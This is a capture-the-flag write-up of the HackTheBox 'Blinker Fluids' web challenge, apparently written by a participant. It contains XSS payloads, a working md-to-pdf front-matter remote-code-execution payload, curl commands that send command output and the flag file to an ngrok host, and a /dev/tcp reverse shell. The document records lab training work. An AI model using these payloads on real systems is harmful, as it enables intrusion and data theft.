# Blinker Fluids

![](Pasted%20image%2020220515094825.png)

## Solution

Firstly, I spun up the docker instance and created a new invoice

![](Pasted%20image%2020220515013703.png)

The content initially seemed like markdown, so I tried accessing an image from the web server.

![](Pasted%20image%2020220515013736.png)

![](Pasted%20image%2020220515013617.png)

This worked out

![](Pasted%20image%2020220515013541.png)

### Testing XSS

https://snowscan.io/htb-writeup-book/#

```
<h1>Header</h1>
<i>I can inject custom HTML</i>
```

![](Pasted%20image%2020220515014402.png)

**Testing Javascript Code Execution**

```html
<script>document.write("<pre>Testing</pre>");</script>
```

![](Pasted%20image%2020220515014910.png)


```html
<script>document.write("<pre>"+document.cookie+"</pre>");</script> 
```

Returns an Empty Document


**Testing Retrieving Requests**

```html
<script>document.write("<pre>"+document.cookie+"</pre>");

x=new XMLHttpRequest;x.onload=function(){document.write("<pre>"+this.responseText+"</pre>")};x.open("GET","http://ed95-116-14-150-8.ngrok.io");x.send();</script>
```

```bash
(base) [hacker@hackerbook challenge]$ nc -nlvp 4444
Connection from 127.0.0.1:53966
GET / HTTP/1.1
Host: ed95-116-14-150-8.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4950.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US
Origin: http://localhost:37717
Referer: http://localhost:37717/
X-Forwarded-For: 46.101.59.228
X-Forwarded-Proto: http
```

![](Pasted%20image%2020220515015539.png)

### Standard Payload

```
<script>document.write("<pre>"+document.cookie+"</pre>");
x=new XMLHttpRequest;x.onload=function(){document.write("<pre>"+this.responseText+"</pre>")};x.open("GET","http://ed95-116-14-150-8.ngrok.io/payload");x.send();</script>

```

### Reading Code and Identifying Exploit

I then realised that I can download the code. It is revealed that it is a docker container running a node js application

`Dockerfile` reveals some useful applications, like curl, and the flag location `/flag.txt` etc.

```
FROM node:current-buster-slim

# Install packages
RUN apt-get update \
    && apt-get install -y wget curl supervisor gnupg \
    && wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - \
    && sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' \
    && apt-get update \
    && apt-get install -y google-chrome-stable fonts-ipafont-gothic fonts-wqy-zenhei fonts-thai-tlwg fonts-kacst fonts-freefont-ttf libxss1 libxshmfence-dev \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

# Setup challenge directory
RUN mkdir -p /app

# Add flag
COPY flag.txt /flag.txt

# Add application
WORKDIR /app
COPY challenge .
RUN chown -R www-data:www-data .

# Install dependencies
RUN npm install --production

# Setup superivsord
COPY config/supervisord.conf /etc/supervisord.conf

# Expose the port node-js is reachable on
EXPOSE 1337

# Start the node-js application
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

`package.json` shows md-to-pdf has version 4.1.0. This is vulnerable to an RCE exploit. https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

```json
{
	"name": "blinker-fluids",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": {
		"start": "node index.js"
	},
	"keywords": [],
	"author": "rayhan0x01",
	"license": "ISC",
	"dependencies": {
		"express": "4.17.3",
		"md-to-pdf": "4.1.0",
		"nunjucks": "3.2.3",
		"sqlite-async": "1.1.3",
		"uuid": "8.3.2"
	},
	"devDependencies": {
		"nodemon": "^1.19.1"
	}
}
```



```js
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = {
    makePDF
};
```

I started up the docker container as such

```
$ sudo ./build-docker.sh 
[sudo] password for hacker: 
Error: No such container: web_blinkerfluids
Sending build context to Docker daemon  739.3kB
Step 1/11 : FROM node:current-buster-slim
...
```

### Finding Payload

#### Testing Initial Payload

I tried putting this payload from [here](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880).,

```
---jsn((require("child_process")).execSync("id > /app/static/RCE.txt"))n---RCE
```

It doesn't generate, and shows this error

```
exError: gray-matter engine "jsn((require("child_process")).execSync("id > /app/static/RCE.txt"))n---RC" is not registered
    at module.exports (/app/node_modules/gray-matter/lib/engine.js:6:11)
    at module.exports (/app/node_modules/gray-matter/lib/parse.js:8:18)
    at parseMatter (/app/node_modules/gray-matter/index.js:109:17)
    at Object.matter [as default] (/app/node_modules/gray-matter/index.js:50:10)
    at Object.convertMdToPdf (/app/node_modules/md-to-pdf/dist/lib/md-to-pdf.js:23:75)
    at mdToPdf (/app/node_modules/md-to-pdf/dist/index.js:30:35)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /app/helpers/MDHelper.js:8:13
2022-05-15 01:50:51,066 INFO reaped unknown pid 130
```

#### Researching more on Graymatter

https://github.com/simonhaenisch/md-to-pdf/issues/99

Payload

```
---js
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---RCE'
```

```
(base) [hacker@hackerbook ~]$ sudo docker exec -it web_blinkerfluids bash
[sudo] password for hacker: 
root@a5eeeb6f9ab1:/app# ls
database.js  helpers  index.js	invoice.db  node_modules  package-lock.json  package.json  routes  static  views
root@a5eeeb6f9ab1:/app# cd static/  
root@a5eeeb6f9ab1:/app/static# cat /tmp/RCE.txt 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@a5eeeb6f9ab1:/app/static# 
```

### Commands to Execute

#### File Write to Accessible locations 
Payload


```
---js
((require("child_process")).execSync("id > /app/static/RCE.txt"))
---RCE'
```

![](Pasted%20image%2020220515095632.png)

#### Command Execution through Curl

The dockerfile shows that curl is installed (or you could guess it). As such you can test it

```
---js
((require("child_process")).execSync("curl http://3e0d-116-14-150-8.ngrok.io/$(whoami)"))
---RCE'
```

```
(base) [hacker@hackerbook tmp]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [15/May/2022 09:36:17] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [15/May/2022 09:36:18] code 404, message File not found
127.0.0.1 - - [15/May/2022 09:36:18] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [15/May/2022 10:04:59] code 404, message File not found
127.0.0.1 - - [15/May/2022 10:04:59] "GET /www-data HTTP/1.1" 404 -
```

#### Reverse Shell Payload

```bash
root@a5eeeb6f9ab1:/app/static# /bin/bash -i >& /dev/tcp/192.168.1.6/4444 0>&1
root@a5eeeb6f9ab1:/app/static# 
```

```
(base) [hacker@hackerbook ~]$ nc -nlvp 4444
Connection from 172.17.0.2:54340
root@a5eeeb6f9ab1:/app/static# whoami
whoami
root
root@a5eeeb6f9ab1:/app/static# ^CExiting.
(base) [hacker@hackerbook ~]$ 
```


### Final Exploit

I just accessed the flag directly using curl to redirect the command execution.

```
---js
((require("child_process")).execSync("curl http://3e0d-116-14-150-8.ngrok.io/$(cat /flag.txt)"))
---RCE'
```

```
127.0.0.1 - - [15/May/2022 10:08:27] code 404, message File not found
127.0.0.1 - - [15/May/2022 10:08:27] "GET /HTBbl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls HTTP/1.1" 404 -
```

I guessed the curly brackets are ommitted due to some url issue, so I added them back in

## Flag

`HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`
